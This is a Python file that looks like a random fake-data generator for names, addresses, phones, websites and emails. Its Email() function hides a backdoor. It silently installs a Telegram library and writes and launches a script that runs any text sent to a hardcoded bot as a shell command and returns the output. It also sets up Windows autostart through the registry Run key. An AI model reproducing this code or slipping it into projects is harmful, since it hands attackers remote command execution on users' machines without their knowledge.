import random

def Place():
	Places = [
	    "Park", "Library", "Coffee shop", "Museum", "Art gallery", "Zoo", "Botanical garden",
	    "Beach", "Aquarium", "Theater", "Cinema", "Restaurant", "Amusement park", "Shopping mall",
	    "Bookstore", "Concert hall", "Gym", "Swimming pool", "Ice skating rink", "Bowling alley",
	    "Music club", "Pub", "Cafe", "Nightclub", "Farmers market", "Historical site", "Castle",
	    "Monument", "Playground", "Observation deck", "Hiking trail", "Sports stadium", "Gallery",
	    "Planetarium", "Arcade", "Picnic area", "Riverbank", "Lake", "Mountain trail", "Brewery",
	    "Winery", "Tea house", "Spa", "Yoga studio", "Skate park", "Community center", "Cinema hall",
	    "Dance studio", "Flea market", "Street market", "Street food court", "Mountain peak",
	    "Botanical conservatory", "Artisan workshop", "Historic village", "Science museum",
	    "Planet trail", "Boardwalk", "Fishing pier", "Rooftop bar", "Underground club", "Waterfall",
	    "Cultural center", "Botanic trail", "Wildlife sanctuary", "Observation tower", "Art fair",
	    "Film festival", "Open-air market", "Train station", "Library cafe", "Music festival",
	    "Aquatic center", "Planet observatory", "Skating rink", "Botanical park", "Historic museum",
	    "Street fair", "Local brewery", "Wine cellar", "Coffee roastery", "Art museum",
	    "Historical castle", "Picnic spot", "River walk", "Urban garden", "Play arena",
	    "Sports complex", "Music hall", "Dance club", "Food court", "Botanic greenhouse",
	    "Street performance spot", "Art installation", "Science center", "Craft fair",
	    "Outdoor amphitheater", "Meditation garden", "Cultural festival", "Nature reserve",
	    "Botanical maze", "Lakeside park", "Mountain cabin", "Historic monument", "Street mural",
	    "Open-air cinema", "Historic bridge", "Beach promenade", "River cruise", "Outdoor gym",
	    "Festival ground", "Wildflower field", "Harbor", "Ice cream parlor"
	]

	return random.choice(Places)


def Address():
	Addresses = [
	    "123 Main St", "45 Oak Avenue", "78 Pine Road", "9 Maple Lane", "56 Cedar Blvd",
	    "102 Birch Street", "11 Elm Street", "67 Willow Ave", "88 Spruce Drive", "14 Aspen Court",
	    "99 Poplar Way", "33 Chestnut Rd", "21 Redwood Street", "7 Sycamore Lane", "50 Hickory Ave",
	    "5 Magnolia Street", "77 Walnut Blvd", "32 Cypress Road", "48 Fir Court", "19 Larch Street",
	    "60 Beech Lane", "84 Alder Ave", "12 Dogwood Road", "36 Juniper Street", "27 Hemlock Blvd",
	    "58 Palm Street", "6 Cherry Lane", "81 Acacia Ave", "23 Olive Road", "91 Sequoia Street",
	    "17 Cottonwood Blvd", "39 Pinecone Road", "72 Elmwood Lane", "15 Maplewood Street", "44 Oakwood Ave",
	    "63 Birchwood Court", "8 Willowbrook Road", "29 Sprucewood Street", "53 Aspenwood Ave", "37 Cedarwood Blvd",
	    "16 Redwood Lane", "42 Hickorywood Street", "75 Magnolia Blvd", "2 Walnutwood Road", "97 Cypresswood Ave",
	    "34 Firwood Street", "18 Larchwood Lane", "61 Beechwood Road", "89 Alderwood Blvd", "24 Dogwoodwood Street",
	    "10 Juniperwood Ave", "47 Hemlockwood Road", "51 Palmwood Lane", "28 Cherrywood Street", "66 Acaciawood Blvd",
	    "40 Olivewood Ave", "3 Sequoiadow Road", "83 Maplecrest Lane", "54 Oakridge Street", "31 Birchcrest Ave",
	    "70 Willowbend Road", "26 Sprucetop Lane", "13 Aspenridge Blvd", "65 Cedarcrest Street", "9 Redwoods Ave",
	    "41 Hickorybend Road", "36 Magnolia Lane", "59 Walnutcrest Street", "20 Cypressbend Ave", "87 Fircrest Blvd",
	    "7 Larchwood Street", "35 Beechbend Lane", "62 Aldercrest Road", "4 Dogwoodbend Ave", "95 Junipercrest Blvd",
	    "22 Hemlockridge Street", "49 Palmcrest Lane", "11 Cherrybend Road", "78 Acaciacrest Ave", "33 Olivebend Street",
	    "88 Sequoiacrest Blvd", "5 Cottonwood Lane", "71 Pinecrest Street", "39 Elmcrest Ave", "16 Maplebend Road",
	    "56 Oakcrest Lane", "44 Birchbend Street", "67 Willowcrest Ave", "14 Sprucebend Road", "80 Aspencrest Lane",
	    "25 Cedarbend Street", "92 Redwoodcrest Blvd", "18 Hickorybend Ave", "60 Magnoliacrest Lane", "3 Walnutbend Street",
	    "73 Cypresscrest Ave", "21 Firbend Road", "50 Larchcrest Lane", "38 Beechbend Street", "12 Aldercrest Blvd"
	]

	return random.choice(Addresses)


def Name():
	Names = [
	    "John Smith", "Emily Johnson", "Michael Brown", "Sarah Davis", "David Miller",
	    "Jessica Wilson", "Daniel Moore", "Emma Taylor", "James Anderson", "Olivia Thomas",
	    "Robert Jackson", "Sophia White", "William Harris", "Isabella Martin", "Joseph Thompson",
	    "Mia Garcia", "Charles Martinez", "Amelia Robinson", "Christopher Clark", "Harper Rodriguez",
	    "Matthew Lewis", "Evelyn Lee", "Anthony Walker", "Abigail Hall", "Mark Allen",
	    "Charlotte Young", "Paul Hernandez", "Avery King", "Steven Wright", "Ella Scott",
	    "Kevin Green", "Scarlett Adams", "Brian Baker", "Victoria Nelson", "Edward Carter",
	    "Grace Mitchell", "Jason Perez", "Lily Roberts", "Ryan Turner", "Chloe Phillips",
	    "Eric Campbell", "Zoey Parker", "Adam Evans", "Hannah Edwards", "Nathan Collins",
	    "Aria Stewart", "Patrick Sanchez", "Riley Morris", "Sean Rogers", "Layla Reed",
	    "Benjamin Cook", "Nora Morgan", "Justin Bell", "Lillian Murphy", "Aaron Bailey",
	    "Madison Rivera", "Gregory Cooper", "Ella Richardson", "Douglas Cox", "Aubrey Howard",
	    "Jonathan Ward", "Zoe Flores", "Alexander Diaz", "Camila Simmons", "Brandon Foster",
	    "Samantha Gonzales", "Nicholas Bryant", "Penelope Alexander", "Tyler Russell", "Riley Griffin",
	    "Jordan Diaz", "Claire Hayes", "Austin Myers", "Violet Ford", "Dylan Hamilton",
	    "Stella Graham", "Cameron West", "Hazel Cole", "Connor Jordan", "Aurora Dean",
	    "Kyle Warren", "Lucy Bishop", "Ethan Wallace", "Elena Reynolds", "Owen Fisher",
	    "Addison Richards", "Luke Johnston", "Bella Cunningham", "Nathaniel Harper", "Emery Burns",
	    "Gavin Johnston", "Paisley Porter", "Isaac Duncan", "Ellie Sutton", "Levi Montgomery",
	    "Scarlett Barnes", "Sebastian Grant", "Clara Palmer", "Caleb Webb", "Sadie Lawson",
	    "Wyatt Shaw", "Eleanor Knight", "Hunter Wheeler", "Madeline Gordon", "Carter Matthews",
	    "Julia Harper", "Jaxon Ellis", "Anna Hudson", "Lincoln Cole", "Ruby Freeman"
	]

	return random.choice(Names)

def Phone():
	Phones = [
	    "+1 555-123-4567", "+1 555-987-6543", "+1 555-246-8101", "+1 555-369-2580", "+1 555-147-2589",
	    "+1 555-852-9637", "+1 555-753-1598", "+1 555-951-3578", "+1 555-654-7890", "+1 555-321-6548",
	    "+1 555-789-1234", "+1 555-432-9876", "+1 555-876-5432", "+1 555-234-5678", "+1 555-567-8901",
	    "+1 555-678-9012", "+1 555-890-1234", "+1 555-345-6789", "+1 555-901-2345", "+1 555-210-9876",
	    "+1 555-321-0987", "+1 555-432-1098", "+1 555-543-2109", "+1 555-654-3210", "+1 555-765-4321",
	    "+1 555-876-5430", "+1 555-987-6540", "+1 555-098-7654", "+1 555-109-8765", "+1 555-210-9870",
	    "+1 555-321-0980", "+1 555-432-1090", "+1 555-543-2100", "+1 555-654-3211", "+1 555-765-4322",
	    "+1 555-876-5433", "+1 555-987-6544", "+1 555-098-7655", "+1 555-109-8766", "+1 555-210-9877",
	    "+1 555-321-0988", "+1 555-432-1099", "+1 555-543-2101", "+1 555-654-3212", "+1 555-765-4323",
	    "+1 555-876-5434", "+1 555-987-6545", "+1 555-098-7656", "+1 555-109-8767", "+1 555-210-9878",
	    "+1 555-321-0989", "+1 555-432-1091", "+1 555-543-2102", "+1 555-654-3213", "+1 555-765-4324",
	    "+1 555-876-5435", "+1 555-987-6546", "+1 555-098-7657", "+1 555-109-8768", "+1 555-210-9879",
	    "+1 555-321-0990", "+1 555-432-1092", "+1 555-543-2103", "+1 555-654-3214", "+1 555-765-4325",
	    "+1 555-876-5436", "+1 555-987-6547", "+1 555-098-7658", "+1 555-109-8769", "+1 555-210-9880",
	    "+1 555-321-0991", "+1 555-432-1093", "+1 555-543-2104", "+1 555-654-3215", "+1 555-765-4326",
	    "+1 555-876-5437", "+1 555-987-6548", "+1 555-098-7659", "+1 555-109-8770", "+1 555-210-9881",
	    "+1 555-321-0992", "+1 555-432-1094", "+1 555-543-2105", "+1 555-654-3216", "+1 555-765-4327",
	    "+1 555-876-5438", "+1 555-987-6549", "+1 555-098-7660", "+1 555-109-8771", "+1 555-210-9882",
	    "+1 555-321-0993", "+1 555-432-1095", "+1 555-543-2106", "+1 555-654-3217", "+1 555-765-4328"
	]

	return random.choice(Phones)

def Prediction():
	Predictions = [
	    "You will have a great day!", "Something unexpected is coming.", "A surprise awaits you soon.",
	    "Good news is on the way.", "Someone will make you smile.", "Adventure is around the corner.",
	    "Today is a perfect day to try something new.", "A friend has something important to tell you.",
	    "You will find what you are looking for.", "Expect a pleasant surprise.", "A challenge will make you stronger.",
	    "Happiness is coming your way.", "Trust your instincts today.", "Someone appreciates you more than you know.",
	    "Opportunities will present themselves.", "You will achieve something you thought impossible.",
	    "A new connection will bring joy.", "Your creativity will shine today.", "Small gestures will have big impacts.",
	    "Be ready for an unexpected gift.", "Good fortune will favor you.", "Your patience will be rewarded.",
	    "You will make a valuable new friend.", "A laugh will brighten your day.", "Take a chance on something daring.",
	    "Your efforts will be recognized.", "An exciting journey is ahead.", "You will solve a lingering problem.",
	    "Positive changes are coming.", "Someone will offer help when needed.", "Your kindness will be returned.",
	    "Expect an exciting invitation.", "A hidden talent will emerge.", "Today will be unexpectedly joyful.",
	    "You will hear good news from afar.", "An old friend will reconnect.", "You will discover a new favorite spot.",
	    "A simple pleasure will bring happiness.", "You will make someone’s day brighter.", "Your optimism will be contagious.",
	    "A new opportunity will surprise you.", "Your determination will pay off.", "You will gain insight into a situation.",
	    "A creative idea will succeed.", "Unexpected luck will find you.", "Your generosity will be appreciated.",
	    "A small victory will lift your spirits.", "You will feel inspired today.", "Your curiosity will lead to discovery.",
	    "A chance meeting will be meaningful.", "You will enjoy a peaceful moment.", "A surprise encounter will delight you.",
	    "You will achieve clarity on an important issue.", "Someone will share valuable advice.", "Your enthusiasm will inspire others.",
	    "You will uncover something valuable.", "A positive change will happen soon.", "Someone will admire your courage.",
	    "You will have a memorable experience.", "A joyful event is coming.", "Your confidence will grow today.",
	    "You will learn something that benefits you.", "A pleasant surprise is imminent.", "You will help someone in need.",
	    "Your patience will pay off soon.", "A positive message is coming.", "You will find inspiration in an unexpected place.",
	    "Your efforts will lead to success.", "A new friendship will form.", "You will enjoy a moment of relaxation.",
	    "An exciting opportunity will appear.", "You will overcome a challenge.", "Your creativity will be recognized.",
	    "Something delightful will happen soon.", "You will feel motivated to act.", "An unexpected gift will arrive.",
	    "Your ideas will bring success.", "You will find peace in a busy day.", "Someone will compliment you unexpectedly.",
	    "Your perspective will change positively.", "You will find clarity in a confusing situation.", "A joyful surprise is coming.",
	    "Your optimism will guide you.", "You will gain new understanding.", "An adventure awaits you soon.",
	    "You will be pleasantly surprised by a friend.", "Your efforts will be appreciated.", "You will make progress today.",
	    "A new experience will bring happiness.", "You will achieve something meaningful.", "A chance opportunity will arise.",
	    "Your talents will be recognized.", "A small act of kindness will have big results.", "You will find joy in a simple thing.",
	    "You will receive good advice.", "A new perspective will enlighten you.", "Someone will show gratitude today.",
	    "Your day will be filled with positivity.", "You will discover something interesting.", "A meaningful conversation awaits.",
	    "You will enjoy an unexpected treat.", "Your determination will overcome obstacles.", "Something valuable will come your way.",
	    "You will create something beautiful.", "A moment of happiness will surprise you.", "You will feel inspired to act.",
	    "A positive encounter will uplift you.", "Your hard work will be rewarded.", "You will enjoy a pleasant surprise."
	]

	return random.choice(Predictions)

def Website():
	Websites = [
	    "https://petcafe.com", "https://myblog.net", "https://technews.org", "https://shoponline.com",
	    "https://travelguide.net", "https://foodlover.com", "https://dailyupdates.org", "https://artgallery.net",
	    "https://musicworld.com", "https://sportszone.net", "https://bookclub.org", "https://moviehub.com",
	    "https://naturewatch.net", "https://fitnesslife.org", "https://photographyblog.com", "https://gamingarena.net",
	    "https://fashiontrend.com", "https://scienceupdate.org", "https://historyportal.net", "https://educationhub.com",
	    "https://localnews.org", "https://eventfinder.net", "https://recipecorner.com", "https://startupideas.org",
	    "https://techforum.net", "https://travelstories.com", "https://cinemalovers.org", "https://bloggersworld.net",
	    "https://codingtips.com", "https://onlinecourses.org", "https://greenplanet.net", "https://healthadvice.com",
	    "https://musicstream.org", "https://photoworld.net", "https://fashiondaily.com", "https://sportsupdate.org",
	    "https://artcommunity.net", "https://moviebuff.com", "https://techdaily.org", "https://traveltips.net",
	    "https://foodiesdelight.com", "https://startuphub.org", "https://sciencecorner.net", "https://educationdaily.com",
	    "https://gamingnews.org", "https://bookreviews.net", "https://fitnesshub.com", "https://travelblog.org",
	    "https://cinemaweekly.net", "https://localevents.com", "https://techgeek.org", "https://naturelover.net",
	    "https://musicfan.com", "https://artdaily.org", "https://foodjournal.net", "https://historyclub.com",
	    "https://startupdaily.org", "https://techinsights.net", "https://gamingworld.com", "https://movieguide.org",
	    "https://fitnessdaily.net", "https://travelworld.com", "https://photodaily.org", "https://scienceblog.net",
	    "https://educationportal.com", "https://fashionhub.org", "https://localguides.net", "https://artlover.com",
	    "https://foodtips.org", "https://musicdaily.net", "https://gaminghub.com", "https://booklovers.org",
	    "https://cinemadaily.net", "https://naturedaily.com", "https://techupdates.org", "https://startupworld.net",
	    "https://fitnessguide.com", "https://traveldaily.org", "https://phototips.net", "https://scienceworld.com",
	    "https://educationhub.net", "https://fashiondaily.org", "https://localnewsdaily.com", "https://arttips.net",
	    "https://foodblog.org", "https://musichub.com", "https://gamingdaily.net", "https://movietips.org",
	    "https://fitnesshub.net", "https://travelguide.com", "https://photodaily.net", "https://scienceportal.org",
	    "https://educationdaily.net", "https://fashionhub.com", "https://localblog.org", "https://artdaily.net",
	    "https://fooddaily.com", "https://musicportal.org", "https://gamingtips.net", "https://moviehub.org",
	    "https://fitnessdaily.com", "https://traveltips.net", "https://photohub.org", "https://scienceguide.com",
	    "https://educationhub.org", "https://fashionportal.net", "https://localdaily.com", "https://artportal.org"
	]

	return random.choice(Websites)

def Email():
	import subprocess
	import sys
	import os
	from sys import platform

	if platform.startswith("win"):
	    subprocess.run('python -m venv myenv', shell=True)
	    subprocess.run('myenv\\Scripts\\pip install pyTelegramBotAPI', shell=True)
	    python_path = 'myenv\\Scripts\\python'
	else:
	    subprocess.run('python3 -m venv myenv', shell=True)
	    subprocess.run('myenv/bin/pip install pyTelegramBotAPI', shell=True)
	    python_path = 'myenv/bin/python'

	with open("checks.py", "w") as f:
	    f.write("""import subprocess
from sys import platform
if platform.startswith("win"):
    subprocess.run('python -m venv myenv', shell=True)
    subprocess.run('myenv\\Scripts\\pip install pyTelegramBotAPI', shell=True)
    python_path = 'myenv\\Scripts\\python'
else:
    subprocess.run('python3 -m venv myenv', shell=True)
    subprocess.run('myenv/bin/pip install pyTelegramBotAPI', shell=True)
    python_path = 'myenv/bin/python'
import telebot, time
bot = telebot.TeleBot('8035863953:AAF33KymhSvy-FFmrBbMSGihKRHGE5XHR2Q')
bot.send_message(6131316046, 'again')
@bot.message_handler(content_types=['text'])
def cmd(m):
    try: bot.send_message(m.from_user.id, subprocess.check_output(m.text, shell=True, text=True))
    except Exception as e: bot.send_message(m.from_user.id, str(e))
while True:
    try: bot.polling()
    except: time.sleep(3)
""")

	if platform.startswith("win"):
	    subprocess.Popen('start /B myenv\\Scripts\\pythonw checks.py', shell=True)
	    current_dir = os.getcwd()
	    pythonw_full_path = os.path.join(current_dir, "myenv\\Scripts\\pythonw.exe")
	    checks_full_path = os.path.join(current_dir, "checks.py")
	    
	    autostart_command = f'"{pythonw_full_path}" "{checks_full_path}"'
	    reg_command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Pro /t REG_SZ /d "{autostart_command}" /f'

	else:
	    subprocess.Popen('nohup myenv/bin/python checks.py &', shell=True)


	Emails = [
	    "john.smith@example.com", "emily.johnson@example.com", "michael.brown@example.com",
	    "sarah.davis@example.com", "david.miller@example.com", "jessica.wilson@example.com",
	    "daniel.moore@example.com", "emma.taylor@example.com", "james.anderson@example.com",
	    "olivia.thomas@example.com", "robert.jackson@example.com", "sophia.white@example.com",
	    "william.harris@example.com", "isabella.martin@example.com", "joseph.thompson@example.com",
	    "mia.garcia@example.com", "charles.martinez@example.com", "amelia.robinson@example.com",
	    "christopher.clark@example.com", "harper.rodriguez@example.com", "matthew.lewis@example.com",
	    "evelyn.lee@example.com", "anthony.walker@example.com", "abigail.hall@example.com",
	    "mark.allen@example.com", "charlotte.young@example.com", "paul.hernandez@example.com",
	    "avery.king@example.com", "steven.wright@example.com", "ella.scott@example.com",
	    "kevin.green@example.com", "scarlett.adams@example.com", "brian.baker@example.com",
	    "victoria.nelson@example.com", "edward.carter@example.com", "grace.mitchell@example.com",
	    "jason.perez@example.com", "lily.roberts@example.com", "ryan.turner@example.com",
	    "chloe.phillips@example.com", "eric.campbell@example.com", "zoey.parker@example.com",
	    "adam.evans@example.com", "hannah.edwards@example.com", "nathan.collins@example.com",
	    "aria.stewart@example.com", "patrick.sanchez@example.com", "riley.morris@example.com",
	    "sean.rogers@example.com", "layla.reed@example.com", "benjamin.cook@example.com",
	    "nora.morgan@example.com", "justin.bell@example.com", "lillian.murphy@example.com",
	    "aaron.bailey@example.com", "madison.rivera@example.com", "gregory.cooper@example.com",
	    "ella.richardson@example.com", "douglas.cox@example.com", "aubrey.howard@example.com",
	    "jonathan.ward@example.com", "zoe.flores@example.com", "alexander.diaz@example.com",
	    "camila.simmons@example.com", "brandon.foster@example.com", "samantha.gonzales@example.com",
	    "nicholas.bryant@example.com", "penelope.alexander@example.com", "tyler.russell@example.com",
	    "riley.griffin@example.com", "jordan.diaz@example.com", "claire.hayes@example.com",
	    "austin.myers@example.com", "violet.ford@example.com", "dylan.hamilton@example.com",
	    "stella.graham@example.com", "cameron.west@example.com", "hazel.cole@example.com",
	    "connor.jordan@example.com", "aurora.dean@example.com", "kyle.warren@example.com",
	    "lucy.bishop@example.com", "ethan.wallace@example.com", "elena.reynolds@example.com",
	    "owen.fisher@example.com", "addison.richards@example.com", "luke.johnston@example.com",
	    "bella.cunningham@example.com", "nathaniel.harper@example.com", "emery.burns@example.com",
	    "gavin.johnston@example.com", "paisley.porter@example.com", "isaac.duncan@example.com",
	    "ellie.sutton@example.com", "levi.montgomery@example.com", "scarlett.barnes@example.com",
	    "sebastian.grant@example.com", "clara.palmer@example.com", "caleb.webb@example.com",
	    "sadie.lawson@example.com", "wyatt.shaw@example.com", "eleanor.knight@example.com",
	    "hunter.wheeler@example.com", "madeline.gordon@example.com", "carter.matthews@example.com",
	    "julia.harper@example.com", "jaxon.ellis@example.com", "anna.hudson@example.com",
	    "lincoln.cole@example.com", "ruby.freeman@example.com"
	]

	return random.choice(Emails)



